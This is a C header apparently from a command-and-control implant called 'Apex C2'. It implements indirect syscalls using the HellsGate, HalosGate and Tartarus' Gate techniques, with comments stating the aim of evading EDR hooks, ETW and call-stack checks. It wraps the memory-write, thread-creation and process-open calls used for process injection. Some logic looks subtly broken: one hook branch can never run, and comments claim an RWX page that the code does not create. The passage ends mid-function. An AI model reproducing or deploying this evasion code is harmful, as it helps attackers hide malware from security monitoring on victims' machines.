/*
 * syscall.h - Apex C2 Indirect Syscall Engine
 * Compatible with: x86_64-w64-mingw32-gcc (MinGW-w64)
 *
 * Three SSN resolution strategies (tried in order for AUTO mode):
 *
 *   1. HellsGate  - Maps ntdll.dll from disk. Sorts Nt* exports by RVA;
 *                   index in sorted list == SSN.  Bypasses all in-memory
 *                   hooks that EDRs place in the loaded copy of ntdll.
 *
 *   2. HalosGate  - Inspects in-memory ntdll stubs.  If a stub is hooked,
 *                   walks ±HALO_SCAN_RADIUS adjacent stubs (address-sorted)
 *                   to find the nearest clean one and derives the target SSN
 *                   by ±delta.
 *
 *   3. Tartarus'  - Handles hooks that preserve `mov r10,rcx` (bytes 0-2)
 *                   but overwrite `mov eax,<SSN>` (bytes 3-7).  Detected
 *                   by finding bytes 0-2 intact but byte 3 is not 0xB8.
 *
 * The `syscall` instruction executes from our own RWX page, NOT from inside
 * ntdll.  This defeats EDR call-stack heuristics that flag syscalls whose
 * return address falls outside ntdll's .text section.
 *
 * Usage:
 *   gate_init();                                      // once at startup
 *   Gate_NtAllocateVirtualMemory(...);                // use wrappers
 *
 * Build flags:
 *   -DENABLE_INDIRECT_SYSCALL=1
 *   -DSYSCALL_METHOD=0   (0=auto, 1=hellsgate-disk, 2=halosgate-mem)
 */

#ifndef APEX_SYSCALL_H
#define APEX_SYSCALL_H

/* Suppress "cast between incompatible function types" for FARPROC casts.
 * These are intentional: we know the actual signature and cast deliberately. */
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wcast-function-type"
/* Suppress "defined but not used" for wrappers that are available for use
 * by other modules but not all called from main.c. */
#pragma GCC diagnostic ignored "-Wunused-function"
#pragma GCC diagnostic ignored "-Wunused-variable"

#include <windows.h>

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

/* ── Configuration ──────────────────────────────────────────────── */

#ifndef SYSCALL_METHOD
#define SYSCALL_METHOD 0   /* 0=auto, 1=hellsgate(disk), 2=halosgate(mem) */
#endif

#define HALO_SCAN_RADIUS  32    /* neighbours to check in each direction */
#define GATE_MAX_EXPORTS  2048  /* max Nt* functions to track */

/* ── Internal structures ─────────────────────────────────────────── */

typedef struct {
    char  name[128];  /* export name                    */
    DWORD rva;        /* RVA in ntdll                   */
    WORD  ssn;        /* resolved System Service Number */
    BOOL  resolved;   /* TRUE if ssn is valid           */
} gate_entry_t;

static gate_entry_t  g_gate_table[GATE_MAX_EXPORTS];
static int           g_gate_count  = 0;
static BOOL          g_gate_ready  = FALSE;

/*
 * Our syscall gadget (placed in our own RWX allocation):
 *   4C 8B D1   mov r10, rcx
 *   0F 05      syscall
 *   C3         ret
 *
 * eax is set by the caller (the wrapper below) immediately before calling
 * this stub.  Because the return address points HERE and not into ntdll,
 * call-stack-walk EDR checks do not see a Nt* frame.
 */
static const BYTE    g_syscall_stub_bytes[] = {
    0x4C, 0x8B, 0xD1,   /* mov r10, rcx */
    0x0F, 0x05,         /* syscall      */
    0xC3                /* ret          */
};
static PVOID         g_syscall_addr = NULL;

/* ── Stub pattern recognition ───────────────────────────────────── */

/* Standard Windows x64 syscall stub prologue:
 *   +0  4C 8B D1        mov r10, rcx
 *   +3  B8 xx xx 00 00  mov eax, <SSN>
 */
static BOOL gate_is_clean_stub(const BYTE *p) {
    return (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8);
}

/* Tartarus variant: bytes 0-2 intact, byte 3 hooked (not 0xB8) */
static BOOL gate_is_tartarus_stub(const BYTE *p) {
    return (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] != 0xB8);
}

static WORD gate_read_ssn_from_stub(const BYTE *p) {
    /* SSN is in bytes 4-5 (low word of the `mov eax, imm32`) */
    return (WORD)((WORD)p[4] | ((WORD)p[5] << 8));
}

/* ── Sort comparator ─────────────────────────────────────────────── */

static int gate_cmp_rva(const void *a, const void *b) {
    const gate_entry_t *ea = (const gate_entry_t*)a;
    const gate_entry_t *eb = (const gate_entry_t*)b;
    if (ea->rva < eb->rva) return -1;
    if (ea->rva > eb->rva) return  1;
    return 0;
}

/* ── RVA → file-offset for a flat file-mapped image ────────────── */

static DWORD gate_rva_to_offset(
    const BYTE *base,
    const IMAGE_SECTION_HEADER *sections,
    WORD num_sections,
    DWORD rva)
{
    for (WORD i = 0; i < num_sections; i++) {
        DWORD sec_rva  = sections[i].VirtualAddress;
        DWORD sec_size = sections[i].SizeOfRawData;
        if (rva >= sec_rva && rva < sec_rva + sec_size)
            return rva - sec_rva + sections[i].PointerToRawData;
    }
    return 0;
}

/* ── Bounds-safe pointer dereference helpers ────────────────────── */

/* Check whether [ptr .. ptr+size-1] lies entirely within [base .. base+file_size-1] */
static BOOL gate_in_bounds(const BYTE *base, SIZE_T file_sz,
                            const BYTE *ptr,  SIZE_T size) {
    if (ptr < base) return FALSE;
    if ((SIZE_T)(ptr - base) > file_sz) return FALSE;
    if ((SIZE_T)(ptr - base) + size > file_sz) return FALSE;
    return TRUE;
}

/* ── HellsGate: resolve SSNs from clean on-disk ntdll ───────────── */

static BOOL gate_resolve_from_disk(void) {
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    LARGE_INTEGER file_size_li;
    if (!GetFileSizeEx(hFile, &file_size_li)) {
        CloseHandle(hFile);
        return FALSE;
    }
    if (file_size_li.QuadPart > 64 * 1024 * 1024) { /* sanity: <64 MB */
        CloseHandle(hFile);
        return FALSE;
    }
    SIZE_T file_sz = (SIZE_T)file_size_li.QuadPart;

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return FALSE; }

    const BYTE *base = (const BYTE*)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!base) { CloseHandle(hMap); CloseHandle(hFile); return FALSE; }

    BOOL ok = FALSE;
    int  count = 0;

    /* ── Validate DOS header ── */
    if (!gate_in_bounds(base, file_sz, base, sizeof(IMAGE_DOS_HEADER)))
        goto done;
    const IMAGE_DOS_HEADER *dos = (const IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) goto done;

    /* ── Validate NT headers ── */
    if (!gate_in_bounds(base, file_sz, base + dos->e_lfanew,
                        sizeof(IMAGE_NT_HEADERS64))) goto done;
    const IMAGE_NT_HEADERS64 *nt =
        (const IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) goto done;

    /* ── Locate section headers ── */
    WORD num_sec = nt->FileHeader.NumberOfSections;
    const IMAGE_SECTION_HEADER *sec =
        (const IMAGE_SECTION_HEADER*)((const BYTE*)&nt->OptionalHeader +
         nt->FileHeader.SizeOfOptionalHeader);
    if (!gate_in_bounds(base, file_sz, (const BYTE*)sec,
                        (SIZE_T)num_sec * sizeof(IMAGE_SECTION_HEADER)))
        goto done;

    /* ── Locate export directory ── */
    DWORD exp_rva = nt->OptionalHeader.DataDirectory[
                        IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD exp_sz  = nt->OptionalHeader.DataDirectory[
                        IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!exp_rva) goto done;

    DWORD exp_off = gate_rva_to_offset(base, sec, num_sec, exp_rva);
    if (!exp_off) goto done;
    if (!gate_in_bounds(base, file_sz, base + exp_off,
                        sizeof(IMAGE_EXPORT_DIRECTORY))) goto done;

    const IMAGE_EXPORT_DIRECTORY *exp =
        (const IMAGE_EXPORT_DIRECTORY*)(base + exp_off);

    DWORD names_off  = gate_rva_to_offset(base, sec, num_sec, exp->AddressOfNames);
    DWORD ords_off   = gate_rva_to_offset(base, sec, num_sec, exp->AddressOfNameOrdinals);
    DWORD funcs_off  = gate_rva_to_offset(base, sec, num_sec, exp->AddressOfFunctions);
    if (!names_off || !ords_off || !funcs_off) goto done;

    const DWORD *nameRVAs = (const DWORD*)(base + names_off);
    const WORD  *ordinals = (const WORD*)(base + ords_off);
    const DWORD *funcRVAs = (const DWORD*)(base + funcs_off);

    for (DWORD i = 0; i < exp->NumberOfNames && count < GATE_MAX_EXPORTS; i++) {
        if (!gate_in_bounds(base, file_sz, (const BYTE*)&nameRVAs[i], sizeof(DWORD)))
            break;
        DWORD name_off = gate_rva_to_offset(base, sec, num_sec, nameRVAs[i]);
        if (!name_off) continue;
        if (!gate_in_bounds(base, file_sz, base + name_off, 4)) continue;
        const char *name = (const char*)(base + name_off);
        /* We only track Nt* (syscall) stubs, not Rtl* / Ldr* */
        if (name[0] != 'N' || name[1] != 't') continue;

        if (!gate_in_bounds(base, file_sz, (const BYTE*)&ordinals[i], sizeof(WORD)))
            break;
        WORD ord = ordinals[i];
        if (ord >= exp->NumberOfFunctions) continue;
        if (!gate_in_bounds(base, file_sz, (const BYTE*)&funcRVAs[ord], sizeof(DWORD)))
            continue;
        DWORD fRVA = funcRVAs[ord];
        /* Skip export forwarders */
        if (fRVA >= exp_rva && fRVA < exp_rva + exp_sz) continue;

        strncpy(g_gate_table[count].name, name, 127);
        g_gate_table[count].name[127] = '\0';
        g_gate_table[count].rva      = fRVA;
        g_gate_table[count].ssn      = 0;
        g_gate_table[count].resolved = FALSE;
        count++;
    }

    if (count == 0) goto done;

    /* Sort by RVA → position == SSN */
    qsort(g_gate_table, (size_t)count, sizeof(gate_entry_t), gate_cmp_rva);
    for (int i = 0; i < count; i++) {
        g_gate_table[i].ssn      = (WORD)i;
        g_gate_table[i].resolved = TRUE;
    }
    g_gate_count = count;
    ok = TRUE;

done:
    UnmapViewOfFile(base);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return ok;
}

/* ── HalosGate: resolve SSNs from in-memory ntdll (with scan) ─── */

static void gate_build_mem_index(HMODULE ntdll) {
    const BYTE *base = (const BYTE*)ntdll;

    const IMAGE_DOS_HEADER *dos = (const IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;

    const IMAGE_NT_HEADERS64 *nt =
        (const IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    const IMAGE_DATA_DIRECTORY *expDir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDir->VirtualAddress) return;

    const IMAGE_EXPORT_DIRECTORY *exp =
        (const IMAGE_EXPORT_DIRECTORY*)(base + expDir->VirtualAddress);
    const DWORD *nameRVAs = (const DWORD*)(base + exp->AddressOfNames);
    const WORD  *ordinals = (const WORD*)(base + exp->AddressOfNameOrdinals);
    const DWORD *funcRVAs = (const DWORD*)(base + exp->AddressOfFunctions);

    int count = g_gate_count; /* start after any disk-resolved entries */

    for (DWORD i = 0; i < exp->NumberOfNames && count < GATE_MAX_EXPORTS; i++) {
        const char *name = (const char*)(base + nameRVAs[i]);
        if (name[0] != 'N' || name[1] != 't') continue;
        WORD  ord  = ordinals[i];
        if (ord >= exp->NumberOfFunctions) continue;
        DWORD fRVA = funcRVAs[ord];
        if (fRVA >= expDir->VirtualAddress &&
            fRVA <  expDir->VirtualAddress + expDir->Size) continue;

        /* Skip if already in table */
        BOOL found = FALSE;
        for (int j = 0; j < count; j++) {
            if (strcmp(g_gate_table[j].name, name) == 0) { found = TRUE; break; }
        }
        if (found) continue;

        strncpy(g_gate_table[count].name, name, 127);
        g_gate_table[count].name[127] = '\0';
        g_gate_table[count].rva      = fRVA;
        g_gate_table[count].ssn      = 0;
        g_gate_table[count].resolved = FALSE;
        count++;
    }

    if (count == 0) return;

    /* Sort entire table by RVA for neighbour-delta logic */
    qsort(g_gate_table, (size_t)count, sizeof(gate_entry_t), gate_cmp_rva);

    /* First pass: read SSN from any unhooked stub directly */
    for (int i = 0; i < count; i++) {
        if (g_gate_table[i].resolved) continue;
        const BYTE *stub = base + g_gate_table[i].rva;
        if (gate_is_clean_stub(stub)) {
            g_gate_table[i].ssn      = gate_read_ssn_from_stub(stub);
            g_gate_table[i].resolved = TRUE;
        }
    }

    /* Second pass: HalosGate scan for hooked stubs */
    for (int i = 0; i < count; i++) {
        if (g_gate_table[i].resolved) continue;
        const BYTE *stub = base + g_gate_table[i].rva;

        /* Both hook variants (full hook or Tartarus partial hook) */
        if (!gate_is_clean_stub(stub)) {
            for (int delta = 1; delta <= HALO_SCAN_RADIUS; delta++) {
                /* Search forward */
                if (i + delta < count) {
                    const BYTE *ns = base + g_gate_table[i + delta].rva;
                    if (gate_is_clean_stub(ns)) {
                        WORD nsn = gate_read_ssn_from_stub(ns);
                        g_gate_table[i].ssn      = (WORD)(nsn - delta);
                        g_gate_table[i].resolved = TRUE;
                        break;
                    }
                }
                /* Search backward */
                if (i - delta >= 0) {
                    const BYTE *ns = base + g_gate_table[i - delta].rva;
                    if (gate_is_clean_stub(ns)) {
                        WORD nsn = gate_read_ssn_from_stub(ns);
                        g_gate_table[i].ssn      = (WORD)(nsn + delta);
                        g_gate_table[i].resolved = TRUE;
                        break;
                    }
                }
                if (g_gate_table[i].resolved) break;
            }
        }
        /* Tartarus' Gate: bytes 0-2 intact, bytes 3+ hooked */
        else if (gate_is_tartarus_stub(stub)) {
            for (int delta = 1; delta <= HALO_SCAN_RADIUS; delta++) {
                if (i + delta < count) {
                    const BYTE *ns = base + g_gate_table[i + delta].rva;
                    if (gate_is_clean_stub(ns)) {
                        WORD nsn = gate_read_ssn_from_stub(ns);
                        g_gate_table[i].ssn      = (WORD)(nsn - delta);
                        g_gate_table[i].resolved = TRUE;
                        break;
                    }
                }
                if (!g_gate_table[i].resolved && i - delta >= 0) {
                    const BYTE *ns = base + g_gate_table[i - delta].rva;
                    if (gate_is_clean_stub(ns)) {
                        WORD nsn = gate_read_ssn_from_stub(ns);
                        g_gate_table[i].ssn      = (WORD)(nsn + delta);
                        g_gate_table[i].resolved = TRUE;
                        break;
                    }
                }
                if (g_gate_table[i].resolved) break;
            }
        }
    }

    g_gate_count = count;
}

/* ── Initialise gate (call once at startup) ─────────────────────── */

static void gate_init(void) {
    if (g_gate_ready) return;

    g_syscall_addr = VirtualAlloc(NULL, sizeof(g_syscall_stub_bytes),
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_READWRITE);
    if (g_syscall_addr) {
        memcpy(g_syscall_addr, g_syscall_stub_bytes, sizeof(g_syscall_stub_bytes));
        DWORD old;
        VirtualProtect(g_syscall_addr, sizeof(g_syscall_stub_bytes),
                       PAGE_EXECUTE_READ, &old);
    }

#if SYSCALL_METHOD == 1
    gate_resolve_from_disk();
#elif SYSCALL_METHOD == 2
    {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (ntdll) gate_build_mem_index(ntdll);
    }
#else
    /* AUTO: try disk first, then supplement with in-memory scan */
    if (!gate_resolve_from_disk()) {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (ntdll) gate_build_mem_index(ntdll);
    } else {
        /* Disk resolved entries; still run mem scan to catch any
           entries that were forwarders or missed in the file walk */
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (ntdll) gate_build_mem_index(ntdll);
    }
#endif

    g_gate_ready = TRUE;
}

/* ── SSN lookup by function name ────────────────────────────────── */

static WORD gate_get_ssn(const char *func_name) {
    for (int i = 0; i < g_gate_count; i++) {
        if (strcmp(g_gate_table[i].name, func_name) == 0) {
            if (g_gate_table[i].resolved)
                return g_gate_table[i].ssn;
            break;
        }
    }
    /* Fallback: read SSN directly from in-memory ntdll stub (if unhooked) */
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        FARPROC fn = GetProcAddress(ntdll, func_name);
        if (fn) {
            const BYTE *p = (const BYTE*)(void*)fn;
            if (gate_is_clean_stub(p))
                return gate_read_ssn_from_stub(p);
        }
    }
    return 0xFFFF; /* unresolved */
}

/* ── Indirect syscall dispatch ────────────────────────────────────
 *
 * Strategy: each Gate_Nt* wrapper function sets eax = SSN via inline
 * assembly, then calls g_syscall_addr (our RWX stub: mov r10,rcx;
 * syscall; ret).  We must set eax RIGHT BEFORE the call because the
 * compiler may clobber rax between the asm and the indirect call.
 *
 * We use a separate typed function pointer cast to invoke the stub so
 * that the C calling convention correctly places rcx/rdx/r8/r9/stack
 * arguments.  The inline asm just sets eax = SSN.
 *
 * Direct dispatch macro — sets rax then tail-calls the RWX stub:
 */

#define GATE_SET_SSN(ssn) \
    __asm__ volatile ("movl %0, %%eax" : : "r"((DWORD)(ssn)) : "rax")

/* ── NT wrapper function definitions ────────────────────────────── */

/* NtAllocateVirtualMemory */
typedef NTSTATUS (WINAPI *pfn_NtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

static NTSTATUS Gate_NtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)
{
    pfn_NtAllocateVirtualMemory fn;
    WORD ssn = gate_get_ssn("NtAllocateVirtualMemory");
    if (ssn == 0xFFFF || !g_syscall_addr) {
        fn = (pfn_NtAllocateVirtualMemory)
             GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
        if (fn) return fn(ProcessHandle, BaseAddress, ZeroBits,
                          RegionSize, AllocationType, Protect);
        return (NTSTATUS)0xC0000001L;
    }
    fn = (pfn_NtAllocateVirtualMemory)g_syscall_addr;
    GATE_SET_SSN(ssn);
    return fn(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

/* NtProtectVirtualMemory */
typedef NTSTATUS (WINAPI *pfn_NtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

static NTSTATUS Gate_NtProtectVirtualMemory(
    HANDLE ProcessHandle, PVOID *BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection, PULONG OldAccessProtection)
{
    pfn_NtProtectVirtualMemory fn;
    WORD ssn = gate_get_ssn("NtProtectVirtualMemory");
    if (ssn == 0xFFFF || !g_syscall_addr) {
        fn = (pfn_NtProtectVirtualMemory)
             GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
        if (fn) return fn(ProcessHandle, BaseAddress, NumberOfBytesToProtect,
                          NewAccessProtection, OldAccessProtection);
        return (NTSTATUS)0xC0000001L;
    }
    fn = (pfn_NtProtectVirtualMemory)g_syscall_addr;
    GATE_SET_SSN(ssn);
    return fn(ProcessHandle, BaseAddress, NumberOfBytesToProtect,
              NewAccessProtection, OldAccessProtection);
}

/* NtWriteVirtualMemory */
typedef NTSTATUS (WINAPI *pfn_NtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

static NTSTATUS Gate_NtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten)
{
    pfn_NtWriteVirtualMemory fn;
    WORD ssn = gate_get_ssn("NtWriteVirtualMemory");
    if (ssn == 0xFFFF || !g_syscall_addr) {
        fn = (pfn_NtWriteVirtualMemory)
             GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
        if (fn) return fn(ProcessHandle, BaseAddress, Buffer,
                          NumberOfBytesToWrite, NumberOfBytesWritten);
        return (NTSTATUS)0xC0000001L;
    }
    fn = (pfn_NtWriteVirtualMemory)g_syscall_addr;
    GATE_SET_SSN(ssn);
    return fn(ProcessHandle, BaseAddress, Buffer,
              NumberOfBytesToWrite, NumberOfBytesWritten);
}

/* NtCreateThreadEx */
typedef NTSTATUS (WINAPI *pfn_NtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID,
    ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

static NTSTATUS Gate_NtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList)
{
    pfn_NtCreateThreadEx fn;
    WORD ssn = gate_get_ssn("NtCreateThreadEx");
    if (ssn == 0xFFFF || !g_syscall_addr) {
        fn = (pfn_NtCreateThreadEx)
             GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
        if (fn) return fn(ThreadHandle, DesiredAccess, ObjectAttributes,
                          ProcessHandle, StartRoutine, Argument, CreateFlags,
                          ZeroBits, StackSize, MaximumStackSize, AttributeList);
        return (NTSTATUS)0xC0000001L;
    }
    fn = (pfn_NtCreateThreadEx)g_syscall_addr;
    GATE_SET_SSN(ssn);
    return fn(ThreadHandle, DesiredAccess, ObjectAttributes,
              ProcessHandle, StartRoutine, Argument, CreateFlags,
              ZeroBits, StackSize, MaximumStackSize, AttributeList);
}

/* NtWaitForSingleObject */
typedef NTSTATUS (WINAPI *pfn_NtWaitForSingleObject)(
    HANDLE, BOOLEAN, PLARGE_INTEGER);

static NTSTATUS Gate_NtWaitForSingleObject(
    HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout)
{
    pfn_NtWaitForSingleObject fn;
    WORD ssn = gate_get_ssn("NtWaitForSingleObject");
    if (ssn == 0xFFFF || !g_syscall_addr) {
        fn = (pfn_NtWaitForSingleObject)
             GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWaitForSingleObject");
        if (fn) return fn(Handle, Alertable, Timeout);
        return (NTSTATUS)0xC0000001L;
    }
    fn = (pfn_NtWaitForSingleObject)g_syscall_addr;
    GATE_SET_SSN(ssn);
    return fn(Handle, Alertable, Timeout);
}

/* NtOpenProcess — custom struct to avoid winternl conflicts */
typedef struct _GATE_OBJECT_ATTRIBUTES {
    ULONG  Length;
    HANDLE RootDirectory;
    PVOID  ObjectName;  /* PUNICODE_STRING */
    ULONG  Attributes;
    PVOID  SecurityDescriptor;
    PVOID  SecurityQualityOfService;
} GATE_OBJECT_ATTRIBUTES;

typedef struct _GATE_CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} GATE_CLIENT_ID;

typedef NTSTATUS (WINAPI *pfn_NtOpenProcess)(
    PHANDLE, ACCESS_MASK, GATE_OBJECT_ATTRIBUTES*, GATE_CLIENT_ID*);

static NTSTATUS Gate_NtOpenProcess(
    PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
    GATE_OBJECT_ATTRIBUTES *ObjectAttributes, GATE_CLIENT_ID *ClientId)
{
    pfn_NtOpenProcess fn;
    WORD ssn = gate_get_ssn("NtOpenProcess");
    if (ssn == 0xFFFF || !g_syscall_addr) {
        fn = (pfn_NtOpenProcess)
             GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenProcess");
        if (fn) return fn(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
        return (NTSTATUS)0xC0000001L;
    }
    fn = (pfn_NtOpenProcess)g_syscall_addr;
    GATE_SET_SSN(ssn);
    return fn(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

/* NtQuerySystemInformation */
typedef NTSTATUS (WINAPI *pfn_NtQuerySystemInformation)(
    ULONG, PVOID, ULONG, PULONG);

static NTSTATUS Gate_NtQuerySystemInformation(
    ULONG SystemInformationClass, PVOID SystemInformation,
    ULONG SystemInformationLength, PULONG ReturnLength)
{
    pfn_NtQuerySystemInformation fn;
    WORD ssn = gate_get_ssn("NtQuerySystemInformation");
    if (ssn == 0xFFFF || !g_syscall_addr) {
        fn = (pfn_NtQuerySystemInformation)
             GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
        if (fn) return fn(SystemInformationClass, SystemInformation,
                          SystemInformationLength, ReturnLength);
        return (NTSTATUS)0xC0000001L;
    }
    fn = (pfn_NtQuerySystemInformation)g_syscall_addr;
    GATE_SET_SSN(ssn);
    return fn(SystemInformationClass, SystemInformation,
              SystemInformationLength, ReturnLength);
}

/* ── High-level helper: open process by PID ────────────────────── */

static HANDLE Gate_OpenProcess(DWORD dwDesiredAccess, DWORD dwProcessId) {
    HANDLE hProcess = NULL;
    GATE_OBJECT_ATTRIBUTES oa;
    GATE_CLIENT_ID cid;
    memset(&oa,  0, sizeof(oa));
    memset(&cid, 0, sizeof(cid));
    oa.Length = sizeof(GATE_OBJECT_ATTRIBUTES);
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)dwProcessId;
    Gate_NtOpenProcess(&hProcess, dwDesiredAccess, &oa, &cid);
    return hProcess;
}

/* ────────────────────────────────────────────────────────────────────
 * NtCreateUserProcess — direct syscall process creation
 *
 * This replaces CreateProcessA/W entirely, sidestepping:
 *   - kernel32!CreateProcess ETW (Microsoft-Windows-Security-Auditing)
 *   - Win32 API hooks set by AV/EDR on CreateProcessInternalW
 *   - PsSetCreateProcessNotifyRoutineEx callbacks that fire for Win32
 *     layer calls (some EDRs only hook the Win32 path)
 *
 * Reference: ReactOS / Process Hacker / Ionic Wind source
 * ─────────────────────────────────────────────────────────────────── */

/* UNICODE_STRING — needed for process params */
typedef struct _GATE_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} GATE_UNICODE_STRING;

/* RTL_USER_PROCESS_PARAMETERS — opaque but layout-compatible */
typedef struct _GATE_RTL_USER_PROCESS_PARAMETERS {
    BYTE Reserved1[16];
    PVOID Reserved2[10];
    GATE_UNICODE_STRING ImagePathName;
    GATE_UNICODE_STRING CommandLine;
} GATE_RTL_USER_PROCESS_PARAMETERS;

/* PS_ATTRIBUTE — one entry in the attribute list */
typedef struct _GATE_PS_ATTRIBUTE {
    ULONG_PTR Attribute;
    SIZE_T    Size;
    union {
        ULONG_PTR Value;
        PVOID     ValuePtr;
    };
    PSIZE_T   ReturnLength;
} GATE_PS_ATTRIBUTE;

typedef struct _GATE_PS_ATTRIBUTE_LIST {
    SIZE_T             TotalLength;
    GATE_PS_ATTRIBUTE  Attributes[2];
} GATE_PS_ATTRIBUTE_LIST;

/* PS_CREATE_INFO — process creation state block */
typedef enum _GATE_PS_CREATE_STATE {
    PsCreateInitialState,
    PsCreateFailOnFileOpen,
    PsCreateFailOnSectionCreate,
    PsCreateFailExeFormat,
    PsCreateFailMachineMismatch,
    PsCreateFailExeName,
    PsCreateSuccess,
    PsCreateMaximumStates
} GATE_PS_CREATE_STATE;

typedef struct _GATE_PS_CREATE_INFO {
    SIZE_T             Size;
    GATE_PS_CREATE_STATE State;
    union {
        /* PsCreateInitialState */
        struct {
            union {
                ULONG InitFlags;
                struct {
                    UCHAR  WriteOutputOnExit  : 1;
                    UCHAR  DetectManifest     : 1;
                    UCHAR  IFEOSkipDebugger   : 1;
                    UCHAR  IFEODoNotPropagateKeyState : 1;
                    UCHAR  SpareBits1         : 4;
                    UCHAR  SpareBits2         : 8;
                    USHORT ProhibitedImageCharacteristics;
                };
            };
            ACCESS_MASK AdditionalFileAccess;
        } InitState;
        /* PsCreateSuccess */
        struct {
            union {
                ULONG OutputFlags;
                struct {
                    UCHAR ProtectedProcess      : 1;
                    UCHAR AddressSpaceOverride  : 1;
                    UCHAR DevOverrideEnabled    : 1;
                    UCHAR ManifestDetected      : 1;
                    UCHAR ProtectedProcessLight : 1;
                    UCHAR SpareBits3            : 3;
                    UCHAR SpareBits4            : 8;
                    USHORT SpareBits5;
                };
            };
            HANDLE FileHandle;
            HANDLE SectionHandle;
            ULONGLONG UserProcessParametersNative;
            ULONG    UserProcessParametersWow64;
            ULONG    CurrentParameterFlags;
            ULONGLONG PebAddressNative;
            ULONG    PebAddressWow64;
            ULONGLONG ManifestAddress;
            ULONG    ManifestSize;
        } SuccessState;
    };
} GATE_PS_CREATE_INFO;

/* PsAttribute numbers (PROCESS_CREATION_ATTRIBUTE_*) */
#define GATE_PS_ATTRIBUTE_IMAGE_NAME  0x00020005UL
#define GATE_PS_ATTRIBUTE_CLIENT_ID   0x00010003UL
#define GATE_PS_ATTRIBUTE_STD_HANDLE  0x00060007UL

/* NtCreateUserProcess typedef */
typedef NTSTATUS (WINAPI *pfn_NtCreateUserProcess)(
    PHANDLE               ProcessHandle,
    PHANDLE               ThreadHandle,
    ACCESS_MASK           ProcessDesiredAccess,
    ACCESS_MASK           ThreadDesiredAccess,
    PVOID                 ProcessObjectAttributes,   /* OBJECT_ATTRIBUTES* */
    PVOID                 ThreadObjectAttributes,    /* OBJECT_ATTRIBUTES* */
    ULONG                 ProcessFlags,
    ULONG                 ThreadFlags,
    PVOID                 ProcessParameters,         /* RTL_USER_PROCESS_PARAMETERS* */
    GATE_PS_CREATE_INFO  *CreateInfo,
    GATE_PS_ATTRIBUTE_LIST *AttributeList
);

static NTSTATUS Gate_NtCreateUserProcess(
    PHANDLE               ProcessHandle,
    PHANDLE               ThreadHandle,
    ACCESS_MASK           ProcessDesiredAccess,
    ACCESS_MASK           ThreadDesiredAccess,
    PVOID                 ProcessObjectAttributes,
    PVOID                 ThreadObjectAttributes,
    ULONG                 ProcessFlags,
    ULONG                 ThreadFlags,
    PVOID                 ProcessParameters,
    GATE_PS_CREATE_INFO  *CreateInfo,
    GATE_PS_ATTRIBUTE_LIST *AttributeList)
{
    pfn_NtCreateUserProcess fn;
    WORD ssn = gate_get_ssn("NtCreateUserProcess");
